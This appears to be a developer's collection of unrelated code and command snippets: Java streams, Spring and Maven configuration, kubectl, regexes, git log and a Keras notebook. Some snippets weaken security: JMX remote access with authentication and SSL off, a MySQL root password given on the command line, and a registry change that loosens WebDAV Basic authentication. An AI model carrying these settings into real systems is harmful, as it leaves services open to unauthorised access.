 .bytebuddy.dynamic.scaffold,org.assertj.core.internal.bytebuddy.impleme
 ntation,org.assertj.core.internal.bytebuddy.implementation.attribute,or
 g.assertj.core.internal.bytebuddy.implementation.auxiliary,org.assertj.
 core.internal.bytebuddy.matcher,org.assertj.core.internal.bytebuddy.poo
 l";version="3.9.1",org.assertj.core.internal.bytebuddy.implementation;u
 ses:="org.assertj.core.internal.bytebuddy,org.assertj.core.internal.byt
 ebuddy.description.annotation,org.assertj.core.internal.bytebuddy.descr
 iption.enumeration,org.assertj.core.internal.bytebuddy.description.fiel
 d,org.assertj.core.internal.bytebuddy.description.method,org.assertj.co
 re.internal.bytebuddy.description.modifier,org.assertj.core.internal.by
 tebuddy.description.type,org.assertj.core.internal.bytebuddy.dynamic,or
 g.assertj.core.internal.bytebuddy.dynamic.scaffold,org.assertj.core.int
 ernal.bytebuddy.implementation.attribute,org.assertj.core.internal.byte
 buddy.implementation.auxiliary,org.assertj.core.internal.bytebuddy.impl
 ementation.bind,org.assertj.core.internal.bytebuddy.implementation.bind
 .annotation,org.assertj.core.internal.bytebuddy.implementation.bytecode
 ,org.assertj.core.internal.bytebuddy.implementation.bytecode.assign,org
 .assertj.core.internal.bytebuddy.jar.asm,org.assertj.core.internal.byte
 buddy.matcher,org.assertj.core.internal.bytebuddy.utility";version="3.9
 .1",org.assertj.core.internal.bytebuddy.implementation.attribute;uses:=
 "org.assertj.core.internal.bytebuddy.description.annotation,org.assertj
 .core.internal.bytebuddy.description.field,org.assertj.core.internal.by
 tebuddy.description.method,org.assertj.core.internal.bytebuddy.descript
 ion.type,org.assertj.core.internal.bytebuddy.jar.asm";version="3.9.1",o
 rg.assertj.core.internal.bytebuddy.implementation.auxiliary;uses:="org.
 assertj.core.internal.bytebuddy,org.assertj.core.internal.bytebuddy.des
 cription.method,org.assertj.core.internal.bytebuddy.description.modifie
 r,org.assertj.core.internal.bytebuddy.description.type,org.assertj.core
 .internal.bytebuddy.dynamic,org.assertj.core.internal.bytebuddy.dynamic
 .scaffold,org.assertj.core.internal.bytebuddy.implementation,org.assert
 j.core.internal.bytebuddy.implementation.bytecode,org.assertj.core.inte
 rnal.bytebuddy.implementation.bytecode.assign,org.assertj.core.internal
 .bytebuddy.jar.asm";version="3.9.1",org.assertj.core.internal.bytebuddy
 .implementation.bind;uses:="org.assertj.core.internal.bytebuddy.descrip
 tion.method,org.assertj.core.internal.bytebuddy.description.type,org.as
 sertj.core.internal.bytebuddy.implementation,org.assertj.core.internal.
 bytebuddy.implementation.bytecode,org.assertj.core.internal.bytebuddy.i
 mplementation.bytecode.assign,org.assertj.core.internal.bytebuddy.jar.a
 sm";version="3.9.1",org.assertj.core.internal.bytebuddy.implementation.
 bind.annotation;uses:="org.assertj.core.internal.bytebuddy,org.assertj.
 core.internal.bytebuddy.description.annotation,org.assertj.core.interna
 l.bytebuddy.description.field,org.assertj.core.internal.bytebuddy.descr
 iption.method,org.assertj.core.internal.bytebuddy.description.type,org.
 assertj.core.internal.bytebuddy.dynamic,org.assertj.core.internal.byteb
 uddy.dynamic.scaffold,org.assertj.core.internal.bytebuddy.implementatio
 n,org.assertj.core.internal.bytebuddy.implementation.auxiliary,org.asse
 rtj.core.internal.bytebuddy.implementation.bind,org.assertj.core.intern
 al.bytebuddy.implementation.bytecode,org.assertj.core.internal.bytebudd
 y.implementation.bytecode.assign,org.assertj.core.internal.bytebuddy.ja
 r.asm";version="3.9.1",org.assertj.core.internal.bytebuddy.implementati
 on.bytecode;uses:="org.assertj.core.internal.bytebuddy.description.meth
 od,org.assertj.core.internal.bytebuddy.description.type,org.assertj.cor
 e.internal.bytebuddy.implementation,org.assertj.core.internal.bytebuddy
 .jar.asm";version="3.9.1",org.assertj.core.internal.bytebuddy.implement
 ation.bytecode.assign;uses:="org.assertj.core.internal.bytebuddy.descri
 ption.type,org.assertj.core.internal.bytebuddy.implementation,org.asser
 tj.core.internal.bytebuddy.implementation.bytecode,org.assertj.core.int
 ernal.bytebuddy.jar.asm";version="3.9.1",org.assertj.core.internal.byte
 buddy.implementation.bytecode.assign.primitive;uses:="org.assertj.core.
 internal.bytebuddy.description.type,org.assertj.core.internal.bytebuddy
 .implementation,org.assertj.core.internal.bytebuddy.implementation.byte
 code,org.assertj.core.internal.bytebuddy.implementation.bytecode.assign
 ,org.assertj.core.internal.bytebuddy.jar.asm";version="3.9.1",org.asser
 tj.core.internal.bytebuddy.implementation.bytecode.assign.reference;use
 s:="org.assertj.core.internal.bytebuddy.description.type,org.assertj.co
 re.internal.bytebuddy.implementation.bytecode,org.assertj.core.internal
 .bytebuddy.implementation.bytecode.assign";version="3.9.1",org.assertj.
 core.internal.bytebuddy.implementation.bytecode.collection;uses:="org.a
 ssertj.core.internal.bytebuddy.description.type,org.assertj.core.intern
 al.bytebuddy.implementation,org.assertj.core.internal.bytebuddy.impleme
 ntation.bytecode,org.assertj.core.internal.bytebuddy.jar.asm";version="
 3.9.1",org.assertj.core.internal.bytebuddy.implementation.bytecode.cons
 tant;uses:="org.assertj.core.internal.bytebuddy.description.field,org.a
 ssertj.core.internal.bytebuddy.description.method,org.assertj.core.inte
 rnal.bytebuddy.description.type,org.assertj.core.internal.bytebuddy.imp
 lementation,org.assertj.core.internal.bytebuddy.implementation.bytecode
 ,org.assertj.core.internal.bytebuddy.jar.asm,org.assertj.core.internal.
 bytebuddy.utility";version="3.9.1",org.assertj.core.internal.bytebuddy.
 implementation.bytecode.member;uses:="org.assertj.core.internal.bytebud
 dy.description.enumeration,org.assertj.core.internal.bytebuddy.descript
 ion.field,org.assertj.core.internal.bytebuddy.description.method,org.as
 sertj.core.internal.bytebuddy.description.type,org.assertj.core.interna
 l.bytebuddy.implementation,org.assertj.core.internal.bytebuddy.implemen
 tation.bytecode,org.assertj.core.internal.bytebuddy.jar.asm,org.assertj
 .core.internal.bytebuddy.utility";version="3.9.1",org.assertj.core.inte
 rnal.bytebuddy.jar.asm;version="3.9.1",org.assertj.core.internal.bytebu
 ddy.jar.asm.commons;uses:="org.assertj.core.internal.bytebuddy.jar.asm,
 org.assertj.core.internal.bytebuddy.jar.asm.signature";version="3.9.1",
 org.assertj.core.internal.bytebuddy.jar.asm.signature;version="3.9.1",o
 rg.assertj.core.internal.bytebuddy.matcher;uses:="org.assertj.core.inte
 rnal.bytebuddy.description,org.assertj.core.internal.bytebuddy.descript
 ion.annotation,org.assertj.core.internal.bytebuddy.description.field,or
 g.assertj.core.internal.bytebuddy.description.method,org.assertj.core.i
 nternal.bytebuddy.description.type,org.assertj.core.internal.bytebuddy.
 utility";version="3.9.1",org.assertj.core.internal.bytebuddy.pool;uses:
 ="org.assertj.core.internal.bytebuddy.description,org.assertj.core.inte
 rnal.bytebuddy.description.annotation,org.assertj.core.internal.bytebud
 dy.description.enumeration,org.assertj.core.internal.bytebuddy.descript
 ion.field,org.assertj.core.internal.bytebuddy.description.method,org.as
 sertj.core.internal.bytebuddy.description.type,org.assertj.core.interna
 l.bytebuddy.dynamic,org.assertj.core.internal.bytebuddy.jar.asm,org.ass
 ertj.core.internal.bytebuddy.jar.asm.signature";version="3.9.1",org.ass
 ertj.core.internal.bytebuddy.utility;uses:="org.assertj.core.internal.b
 ytebuddy.description,org.assertj.core.internal.bytebuddy.description.fi
 eld,org.assertj.core.internal.bytebuddy.description.method,org.assertj.
 core.internal.bytebuddy.description.type,org.assertj.core.internal.byte
 buddy.implementation.bytecode";version="3.9.1",org.assertj.core.interna
 l.bytebuddy.utility.privilege;version="3.9.1",org.assertj.core.internal
 .bytebuddy.utility.visitor;uses:="org.assertj.core.internal.bytebuddy.d
 escription.method,org.assertj.core.internal.bytebuddy.implementation.by
 tecode,org.assertj.core.internal.bytebuddy.jar.asm";version="3.9.1",org
 .assertj.core.matcher;version="3.9.1",org.assertj.core.presentation;ver
 sion="3.9.1";uses:="org.assertj.core.data,org.assertj.core.groups",org.
 assertj.core.util;version="3.9.1";uses:="org.assertj.core.api.filter,or
 g.assertj.core.presentation",org.assertj.core.util.diff;version="3.9.1"
 ,org.assertj.core.util.diff.myers;version="3.9.1";uses:="org.assertj.co
 re.util.diff",org.assertj.core.util.introspection;version="3.9.1",org.a
 ssertj.core.util.xml;version="3.9.1"
Private-Package: org.assertj.core.internal,org.assertj.core.internal.byt
 ebuddy,org.assertj.core.internal.bytebuddy.asm,org.assertj.core.interna
 l.bytebuddy.agent.builder,org.assertj.core.internal.bytebuddy.dynamic,o
 rg.assertj.core.internal.bytebuddy.dynamic.scaffold,org.assertj.core.in
 ternal.bytebuddy.dynamic.scaffold.subclass,org.assertj.core.internal.by
 tebuddy.dynamic.scaffold.inline,org.assertj.core.internal.bytebuddy.dyn
 amic.loading,org.assertj.core.internal.bytebuddy.utility,org.assertj.co
 re.internal.bytebuddy.utility.visitor,org.assertj.core.internal.bytebud
 dy.utility.privilege,org.assertj.core.internal.bytebuddy.description,or
 g.assertj.core.internal.bytebuddy.description.enumeration,org.assertj.c
 ore.internal.bytebuddy.description.type,org.assertj.core.internal.byteb
 uddy.description.modifier,org.assertj.core.internal.bytebuddy.descripti
 on.method,org.assertj.core.internal.bytebuddy.description.annotation,or
 g.assertj.core.internal.bytebuddy.description.field,org.assertj.core.in
 ternal.bytebuddy.matcher,org.assertj.core.internal.bytebuddy.implementa
 tion,org.assertj.core.internal.bytebuddy.implementation.bytecode,org.as
 sertj.core.internal.bytebuddy.implementation.bytecode.assign.primitive,
 org.assertj.core.internal.bytebuddy.implementation.bytecode.assign,org.
 assertj.core.internal.bytebuddy.implementation.bytecode.assign.referenc
 e,org.assertj.core.internal.bytebuddy.implementation.bytecode.constant,
 org.assertj.core.internal.bytebuddy.implementation.bytecode.collection,
 org.assertj.core.internal.bytebuddy.implementation.bytecode.member,org.
 assertj.core.internal.bytebuddy.implementation.auxiliary,org.assertj.co
 re.internal.bytebuddy.implementation.bind,org.assertj.core.internal.byt
 ebuddy.implementation.bind.annotation,org.assertj.core.internal.bytebud
 dy.implementation.attribute,org.assertj.core.internal.bytebuddy.pool,or
 g.assertj.core.internal.bytebuddy.jar.asm,org.assertj.core.internal.byt
 ebuddy.jar.asm.commons,org.assertj.core.internal.bytebuddy.jar.asm.sign
 ature,org.assertj.core.internal.bytebuddy.build,org.assertj.core.error,
 org.assertj.core.error.future,org.assertj.core.error.uri,org.assertj.co
 re.extractor,org.assertj.core.description,org.assertj.core.matcher,org.
 assertj.core.groups,org.assertj.core.api,org.assertj.core.api.iterable,
 org.assertj.core.api.exception,org.assertj.core.api.filter,org.assertj.
 core.util,org.assertj.core.util.introspection,org.assertj.core.util.xml
 ,org.assertj.core.util.diff,org.assertj.core.util.diff.myers,org.assert
 j.core.condition,org.assertj.core.data,org.assertj.core.configuration,o
 rg.assertj.core.presentation
Require-Capability: osgi.ee;filter:="(&(osgi.ee=JavaSE)(version=1.8))"
Tool: Bnd-3.0.0.201509101326
--------------------------------------------------------------------------------------------------------
awk '{print toupper(substr($0,1,1)) tolower(substr($0,2)) }'
--------------------------------------------------------------------------------------------------------
Stream<String> streamGenerated =
  Stream.generate(() -> "element").limit(10);
  
Stream<Integer> streamIterated = Stream.iterate(40, n -> n + 2).limit(20);

int reducedParallel = Arrays.asList(1, 2, 3).parallelStream()
    .reduce(10, (a, b) -> a + b, (a, b) -> {
       log.info("combiner was called");
       return a + b;
    });

String listToString = productList.stream().map(Product::getName)
  .collect(Collectors.joining(", ", "[", "]"));

int summingPrice = productList.stream()
  .collect(Collectors.summingInt(Product::getPrice));
  
  Collector<Product, ?, LinkedList<Product>> toLinkedList =
  Collector.of(LinkedList::new, LinkedList::add, 
    (first, second) -> { 
       first.addAll(second); 
       return first; 
    });
 
LinkedList<Product> linkedListOfPersons =
  productList.stream().collect(toLinkedList);
  
int reducedParallel = Arrays.asList(1, 2, 3).parallelStream()
    .reduce(10, (a, b) -> a + b, (a, b) -> {
       log.info("combiner was called");
       return a + b;
    });
	
Stream<String> streamOfString =
  Pattern.compile(", ").splitAsStream("a, b, c");
  
Stream<Integer> streamIterated = Stream.iterate(40, n -> n + 2).limit(20);

Stream<String> streamBuilder =
  Stream.<String>builder().add("a").add("b").add("c").build();
--------------------------------------------------------------------------------------------------------
import numpy as np

In [2]:

%matplotlib inline
import matplotlib.pyplot as plt

In [3]:

from sklearn.datasets.samples_generator import make_circles

In [4]:

X, y = make_circles(n_samples=1000,
                    noise=0.1,
                    factor=0.2,
                    random_state=0)


X.shape

plt.figure(figsize=(5, 5))
plt.plot(X[y==0, 0], X[y==0, 1], 'ob', alpha=0.5)
plt.plot(X[y==1, 0], X[y==1, 1], 'xr', alpha=0.5)
plt.xlim(-1.5, 1.5)
plt.ylim(-1.5, 1.5)
plt.legend(['0', '1'])
plt.title("Blue circles and Red crosses");

from tensorflow.keras.models import Sequential
from tensorflow.keras.layers import Dense
from tensorflow.keras.optimizers import SGD

model = Sequential([
    Dense(4, input_shape=(2,), activation='tanh'),
    Dense(1, activation='sigmoid'),
])

model.compile(SGD(lr=0.5),
              'binary_crossentropy',
              metrics=['accuracy'])

model.fit(X, y, epochs=15)

hticks = np.linspace(-1.5, 1.5, 101)
vticks = np.linspace(-1.5, 1.5, 101)
aa, bb = np.meshgrid(hticks, vticks)
ab = np.c_[aa.ravel(), bb.ravel()]
c = model.predict(ab)
cc = c.reshape(aa.shape)

plt.figure(figsize=(5, 5))
plt.contourf(aa, bb, cc, cmap='bwr', alpha=0.2)
plt.plot(X[y==0, 0], X[y==0, 1], 'ob', alpha=0.5)
plt.plot(X[y==1, 0], X[y==1, 1], 'xr', alpha=0.5)
plt.xlim(-1.5, 1.5)
plt.ylim(-1.5, 1.5)
plt.legend(['0', '1'])
plt.title("Blue circles and Red crosses");
--------------------------------------------------------------------------------------------------------
        <plugins>
          <plugin>
            <groupId>org.apache.maven.plugins</groupId>
            <artifactId>maven-antrun-plugin</artifactId>
            <executions>
              <execution>
                <id>prepare-checkout</id>
                <goals>
                  <goal>run</goal>
                </goals>
                <phase>pre-site</phase>
                <configuration>
                  <tasks>
                    <exec executable="svn">
                      <arg line="checkout --depth immediates ${commons.scmPubUrl} ${commons.scmPubCheckoutDirectory}"/>
                    </exec>
                    <exec executable="svn">
                      <arg line="update --set-depth exclude ${commons.scmPubCheckoutDirectory}/javadocs"/>
                    </exec>
                    <pathconvert pathsep=" " property="dirs">
                      <dirset dir="${commons.scmPubCheckoutDirectory}" includes="*"/>
                    </pathconvert>
                    <exec executable="svn">
                      <arg line="update --set-depth infinity ${dirs}"/>
                    </exec>
                  </tasks>
                </configuration>
              </execution>
            </executions>
          </plugin>
        </plugins>
--------------------------------------------------------------------------------------------------------
IntFunction<String[]> intFunction = new IntFunction<String[]>() {
    @Override
    public String[] apply(int value) {
        return new String[value];
    }
};

String[] myNewArray = myNewStream.toArray(intFunction);
--------------------------------------------------------------------------------------------------------
Map<String, String> combined = Stream.of(first, second)
  .map(Map::entrySet)
  .flatMap(Collection::stream)
  .collect(Collectors.toMap(Map.Entry::getKey, Map.Entry::getValue, String::concat));
  
public static <K, V> Map<K, V> zipToMap(List<K> keys, List<V> values) {
    Iterator<K> keyIter = keys.iterator();
    Iterator<V> valIter = values.iterator();
    return IntStream.range(0, keys.size()).boxed()
            .collect(Collectors.toMap(_i -> keyIter.next(), _i -> valIter.next()));
}
--------------------------------------------------------------------------------------------------------
Map<Integer,DataPointSummary> coll = listeAllerPunkte.stream().collect(
    groupingBy(DataPoint::getId, Collector.of(
        DataPointSummary::new, DataPointSummary::add, DataPointSummary::merge)));
--------------------------------------------------------------------------------------------------------
Int wordCount = articleStream.collect(totalWordCountCollector);

Collector.of(  
  () -> new int[1],
  (result, article) -> result[0] += article.getWordCount(),
  (result1, result2) -> {
    result1[0] += result2[0];
    return result1;
  },
  total -> total[0] 
);
--------------------------------------------------------------------------------------------------------
kubectl apply -f <(istioctl kube-inject -f samples/bookinfo/platform/kube/bookinfo.yaml)
kubectl get services
kubectl get pods
kubectl exec -it $(kubectl get pod -l app=ratings -o jsonpath='{.items[0].metadata.name}') -c ratings -- curl productpage:9080/productpage | grep -o "<title>.*</title>"
kubectl get destinationrules -o yaml
$ kubectl get virtualservices   #-- there should be no virtual services
$ kubectl get destinationrules  #-- there should be no destination rules
$ kubectl get gateway           #-- there should be no gateway
$ kubectl get pods               #-- the Bookinfo pods should be deleted
$ kubectl get virtualservices   #-- there should be no more routing rules
$ docker ps -a                   #-- the Bookinfo containers should be deleted

$ kubectl apply -f - <<EOF
apiVersion: extensions/v1beta1
kind: Ingress
metadata:
  name: simple-ingress
  annotations:
    kubernetes.io/ingress.class: istio
spec:
  rules:
  - http:
      paths:
      - path: /echo
        backend:
          serviceName: esp-echo
          servicePort: 80
EOF

$ sudo apt-get update && sudo apt-get install -y mariadb-server
$ sudo mysql

mysql -u root -ppassword test -e "select * from ratings;"

mysql -u root -ppassword test -e  "update ratings set rating=1 where reviewid=1;select * from ratings;"
--------------------------------------------------------------------------------------------------------
  <profiles>
    <profile>
      <id>java9</id>
      <properties>
        <argLine>--add-opens java.base/java.lang=ALL-UNNAMED --add-opens java.base/java.util=ALL-UNNAMED
          --add-opens java.base/java.io=ALL-UNNAMED --add-opens java.base/java.math=ALL-UNNAMED</argLine>
      </properties>
    </profile>
  </profiles>
--------------------------------------------------------------------------------------------------------
(?:\*?\.)+(?:[a-z\d](?:[a-z\d-]{0,63}[a-z\d])?\.)+[a-z\d][a-z\d-]{0,63}[a-z\d]|(?:[a-z\d](?:[a-z\d-]{0,63}[a-z\d])?\.)+[a-z\d][a-z\d-]{0,63}[a-z\d]
domain
^https:\/\/(.*\.)*wired\.com$
(\u00a9|\u00ae|[\u2000-\u3300]|\ud83c[\ud000-\udfff]|\ud83d[\ud000-\udfff]|\ud83e[\ud000-\udfff])
^((?!(10))[0-9]{11})$

String target = someString.replaceAll("<[^>]*>", "");
String target = someString.replaceAll("(?i)<td[^>]*>", "");
String target = someString.replaceAll("(?i)<td[^>]*>", " ").replaceAll("\\s+", " ").trim();
String noHTMLString = htmlString.replaceAll("\\<.*?\\>", "");

body.getContentAsString().replaceAll("\\<.*?\\>", "");
new HtmlToPlainText().getPlainText(Jsoup.parse(html))
--------------------------------------------------------------------------------------------------------
import java.util.regex.Matcher;
import java.util.regex.Pattern;
 
public class UsernameValidator{
 
	  private Pattern pattern;
	  private Matcher matcher;
 
	  private static final String USERNAME_PATTERN = "^[a-z0-9_-]{3,15}$";
 
	  public UsernameValidator(){
		  pattern = Pattern.compile(USERNAME_PATTERN);
	  }
 
	  /**
	   * Validate username with regular expression
	   * @param username username for validation
	   * @return true valid username, false invalid username
	   */
	  public boolean validate(final String username){
 
		  matcher = pattern.matcher(username);
		  return matcher.matches();
 
	  }
}
--------------------------------------------------------------------------------------------------------
       String pathValue = null;
        // extract Path annotation value
        List<AnnotationSource<JavaClassSource>> listAnnotations = javaClass.getAnnotations();
        for (AnnotationSource annotation :listAnnotations) {
            if (annotation.getName().equals("Path")) {
                pathValue = annotation.getStringValue();
            }
        }
        AnnotationSource<JavaClassSource> apiAnnotation = javaClass.addAnnotation("com.wordnik.swagger.annotations.Api");
        apiAnnotation.setLiteralValue("\"" + pathValue + "\"") ;

        List<MethodSource<JavaClassSource>> methods = javaClass.getMethods();

        for (MethodSource<JavaClassSource> method: methods) {
           for (AnnotationSource annotation: method.getAnnotations()) {
               if (annotation.getName().equals("DELETE") || annotation.getName().equals("GET")
                       || annotation.getName().equals("POST") || annotation.getName().equals("PUT")) {
                   String returnTypeClass = method.getReturnType().getQualifiedName();
                   AnnotationSource<JavaClassSource> apiOperation = method.addAnnotation("com.wordnik.swagger.annotations.ApiOperation");
                   apiOperation.setLiteralValue("value", "\"value\"");
                   apiOperation.setLiteralValue("response", "\"" + returnTypeClass + ".class\"");

               }
           }
        }
--------------------------------------------------------------------------------------------------------
@Configuration
    public class SwaggerConfiguration implements WebMvcConfigurer {

      private final String swaggerUILocation = "whatEverLocationYouWant";
      private final String swaggerApiDocsLocation = "whatEverLocationYouWant";

      @Override
      public void addResourceHandlers(ResourceHandlerRegistry registry) {
        registry.addResourceHandler(swaggerUILocation + "**")
            .addResourceLocations("classpath:/swagger-ui/");
        registry.addResourceHandler(swaggerApiDocsLocation + "**")
            .addResourceLocations("classpath:/swagger/");
      }
    }
--------------------------------------------------------------------------------------------------------
<style type=text/css>
<!--
 body 
 { scrollbar-face-color: #006000;
   scrollbar-highlight-color: #9999999;
   scrollbar-shadow-color: #666666;
   scrollbar-3dlight-color: #666666;
   scrollbar-arrow-color: #ffffff;
   scrollbar-track-color: #e0efe0;
   scrollbar-darkshadow-color: #666666;
 }
//-->
</style>
--------------------------------------------------------------------------------------------------------
npm: npm install infinite-scroll

Bower: bower install infinite-scroll --save

Yarn: yarn add infinite-scroll
--------------------------------------------------------------------------------------------------------
curl -X GET "http://vdlg-pba11-auth-1.pba.internal:5000/api/internal/v1/users/alexander.rogalskiy%40paragon-software.com" -H "accept: text/plain"
--------------------------------------------------------------------------------------------------------
Note: Should you find difficulties connecting to the WebDAV directory, update the Basic Authentication Level in Windows Registry.

1. Right-click Start and select Run.

2. Type regedit and press Enter to open Windows Registry Editor.

3. Go to the directory path: “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WebClient\Parameters.”

Map Webdav Drive Windows 10 Registry Editor Parameters Basic Auth Level

4. Find “BasicAuthLevel” value. By default the value is set at 2, but if it’s not, right-click and select Modify and then change to 2.
--------------------------------------------------------------------------------------------------------
sudo apt install flatpak
sudo flatpak remote-add --if-not-exists flathubhttps://dl.flathub.org/repo/flathub.flatpakrepo
sudo flatpak remote-add --if-not-exists winepak https://dl.winepak.org/repo/winepak.flatpakrepo
flatpak search overwatch
sudo flatpak install winepak com.blizzard.Overwatch
--------------------------------------------------------------------------------------------------------
.cursor {cursor: url(cursor.svg) 3 3, pointer;}
.cursor {cursor: url(cursor.svg), url(path/to/image.png), wait;}
.cursor {cursor: url('path/to/image.png'), auto;}
--------------------------------------------------------------------------------------------------------
ip a | grep inet
--------------------------------------------------------------------------------------------------------
git log --oneline
git log --stat
git log -p
git show
git show 97a7c5f0d

git show 97a7c5f0d --stat

git shortlog
git shortlog -s
git shortlog -n
git shortlog -s -n
git log --pretty="%cn committed %h on %cd"
git log --author="Dan Abramov"
git log --author="Dan Abramov" --oneline
git log -4 --oneline
git log --after="1-7-2017"
git log --before="1-7-2017"
git log --after="1-7-2017" --oneline --pretty="%cn committed %h on %cd"
git log --before="a week ago" --oneline --pretty="%cn committed %h on %cd"
git log --merges
git log --decorate --oneline

--------------------------------------------------------------------------------------------------------
spring:
  profiles:
    include: regex
  autoconfigure:
    exclude:
      - org.springframework.boot.autoconfigure.data.redis.RedisAutoConfiguration
      - org.springframework.boot.autoconfigure.data.redis.RedisRepositoriesAutoConfiguration
--------------------------------------------------------------------------------------------------------
    @Bean
    Map<String, ?> hibernateProperties ()
    {
        Map<String, Object> m = new HashMap<> ();
        m.put ("hibernate.dialect", MySQL5Dialect.class);
        m.put ("hibernate.dialect.storage_engine", "innodb");
        boolean devSystem = isDevSystem ();
        m.put ("hibernate.hbm2ddl.auto", devSystem ? "update" : "create-only");  // will need to handle updates by hand on live system, but creation is OK.
        m.put ("hibernate.show_sql", "" + devSystem);
        m.put ("hibernate.cache.use_second_level_cache", "" + !devSystem);
        return m;
    }
--------------------------------------------------------------------------------------------------------
@RequestMapping("/pod/{id}")
@Transactional(readOnly = true)
public Stream<RSSPodcastItem> podItems (@PathVariable("id") UUID id) {
    try (Stream<RSSPodcastItem> items = repository.findByPodcast(...)) {
        return items...;
    }
}

@RestController
public class XService {

    class XDto{
        final int x;
        public XDto(int x) {this.x = x;}
    }

    Stream<XDto> produceX(){
        return IntStream.range(1,10).mapToObj(i -> {
            System.out.println("produce "+i);
            try {Thread.sleep(1000);} catch (InterruptedException e) {e.printStackTrace();}
            return new XDto(i);
        });
    }

    // stream of Server-Sent Events (SSE)
    @GetMapping(value = "/api/x/sse", 
    produces = MediaType.TEXT_EVENT_STREAM_VALUE)
    public Flux<XDto> getXSse() {
        return Flux.fromStream(produceX());
    }

    // stream of JSON lines
    @GetMapping(value = "/api/x/json-stream", 
    produces = MediaType.APPLICATION_STREAM_JSON_VALUE)
    public Flux<XDto> getAllJsonStream() {
        return Flux.fromStream(produceX());
    }

    // same as List<XDto> - blocking JSON list
    @GetMapping(value = "/api/x/json-list", 
    produces = MediaType.APPLICATION_JSON_VALUE)
    public Flux<XDto> getAll() {
        return Flux.fromStream(produceX());
    }
}

try (Stream<User> foundUsersStream 
  = userRepository.findAllByName(USER_NAME_ADAM)) {
  
assertThat(foundUsersStream.count(), equalTo(3l));

    @Autowired
    private FileRepository fileRepository;

    @GetMapping("/test4")
    @Transactional
    public Stream<FileEntity> get4() {
        try (final Stream<FileEntity> items = this.fileRepository.streamAll()) {
            return items;
        }
    }
--------------------------------------------------------------------------------------------------------
package example.springdata.jpa.java8;

import java.util.List;
import java.util.Optional;
import java.util.concurrent.CompletableFuture;
import java.util.stream.Stream;

import org.springframework.data.jpa.repository.Query;
import org.springframework.data.repository.CrudRepository;
import org.springframework.data.repository.Repository;
import org.springframework.scheduling.annotation.Async;

/**
 * Repository to manage {@link Customer} instances.
 *
 * @author Oliver Gierke
 * @author Thomas Darimont
 */
public interface CustomerRepository extends Repository<Customer, Long> {

	/**
	 * Special customization of {@link CrudRepository#findOne(java.io.Serializable)} to return a JDK 8 {@link Optional}.
	 *
	 * @param id
	 * @return
	 */
	Optional<Customer> findById(Long id);

	/**
	 * Saves the given {@link Customer}.
	 *
	 * @param customer
	 * @return
	 */
	<S extends Customer> S save(S customer);

	/**
	 * Sample method to derive a query from using JDK 8's {@link Optional} as return type.
	 *
	 * @param lastname
	 * @return
	 */
	Optional<Customer> findByLastname(String lastname);

	/**
	 * Sample default method to show JDK 8 feature support.
	 *
	 * @param customer
	 * @return
	 */
	default Optional<Customer> findByLastname(Customer customer) {
		return findByLastname(customer == null ? null : customer.lastname);
	}

	/**
	 * Sample method to demonstrate support for {@link Stream} as a return type with a custom query. The query is executed
	 * in a streaming fashion which means that the method returns as soon as the first results are ready.
	 *
	 * @return
	 */
	@Query("select c from Customer c")
	Stream<Customer> streamAllCustomers();

	/**
	 * Sample method to demonstrate support for {@link Stream} as a return type with a derived query. The query is
	 * executed in a streaming fashion which means that the method returns as soon as the first results are ready.
	 *
	 * @return
	 */
	Stream<Customer> findAllByLastnameIsNotNull();

	@Async
	CompletableFuture<List<Customer>> readAllBy();
}
--------------------------------------------------------------------------------------------------------
@Controller
public class CustomErrorController implements ErrorController {

  @RequestMapping("/error")
  @ResponseBody
  public String handleError(HttpServletRequest request) {
      Integer statusCode = (Integer) request.getAttribute("javax.servlet.error.status_code");
      Exception exception = (Exception) request.getAttribute("javax.servlet.error.exception");
      return String.format("<html><body><h2>Sample Error Page</h2><div>Status code: <b>%s</b></div>"
                      + "<div>Exception Message: <b>%s</b></div><body></html>",
              statusCode, exception==null? "N/A": exception.getMessage());
  }

  @Override
  public String getErrorPath() {
      return "/error";
  }
}
--------------------------------------------------------------------------------------------------------
#function to zip text + encrypt, 2 params (text to encrypt, filename w/o extension) 
function zipe() {
    echo "$1" > $2.txt && zip -e $2.zip $2.txt && rm $2.txt
}
--------------------------------------------------------------------------------------------------------
-Dcom.sun.management.jmxremote
-Dcom.sun.management.jmxremote.port=1234
-Dcom.sun.management.jmxremote.authenticate=false
-Dcom.sun.management.jmxremote.ssl=false
-Djava.rmi.server.hostname=127.0.0.1
--------------------------------------------------------------------------------------------------------
import javax.sql.DataSource;

import org.apache.commons.lang.Validate;
import org.springframework.jdbc.core.BatchPreparedStatementSetter;
import org.springframework.jdbc.core.JdbcTemplate;

/**
 * @author bchild
 *
 */
public abstract class AbstractBatchCustomRepositoryImpl {
	
	private JdbcTemplate jdbcTemplate = null;

	protected int executeBatch(String sql, BatchPreparedStatementSetter batchPreparedStatementSetter) {
		Validate.notNull(jdbcTemplate, "Datasource not set for batch statement.");
		int[] rows = jdbcTemplate.batchUpdate(sql, batchPreparedStatementSetter);
		return sumRows(rows);
	}
	
	private int sumRows(int[] rows) {
		int rowCount = 0;
		for(int row : rows) {
			rowCount += row;
		}
		return rowCount;
	}

	public void setDataSource(DataSource dataSource) {
		this.jdbcTemplate = new JdbcTemplate(dataSource);
	}

}


import java.util.Collection;

/**
 * 
 * @author brettchild
 *
 * @param <T>
 */
public interface BatchSaveCustomRepository<T> {
	
	/**
	 * @param records
	 * @return number of records saved
	 */
	int batchSave(Collection<T> records);
}

import java.util.Date;
import java.util.List;

import org.springframework.data.jpa.repository.JpaRepository;
import org.springframework.data.repository.query.Param;

import com.bmchild.data.shared.batch.BatchSaveCustomRepository;

/*
* Our Repository get the default functionality of the JPARepository plus we all also add our batchSave.
* If we wanted to also add a batch update we could make a batch update interface and implement that in our concrete impl class
*/
public interface MyEntityRepository extends JpaRepository<MyEntity, Long>, BatchSaveCustomRepository<MyEntity> {
	
}


import java.sql.Date;
import java.sql.PreparedStatement;
import java.sql.SQLException;
import java.util.Collection;
import java.util.List;

import javax.annotation.PostConstruct;
import javax.sql.DataSource;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Qualifier;
import org.springframework.jdbc.core.BatchPreparedStatementSetter;

import com.bmchild.data.shared.batch.AbstractBatchCustomRepositoryImpl;
import com.bmchild.data.shared.batch.BatchSaveCustomRepository;
import com.bmchild.data.shared.common.util.CollectionUtil;

/*
* Impl of our repo so we can add our batch save functionality
*/
public class MyEntityRepositoryImpl extends AbstractBatchCustomRepositoryImpl implements BatchSaveCustomRepository<MyEntity> {

	private static final String BATCH_INSERT_SQL = "insert into myentity (field1, field2) "
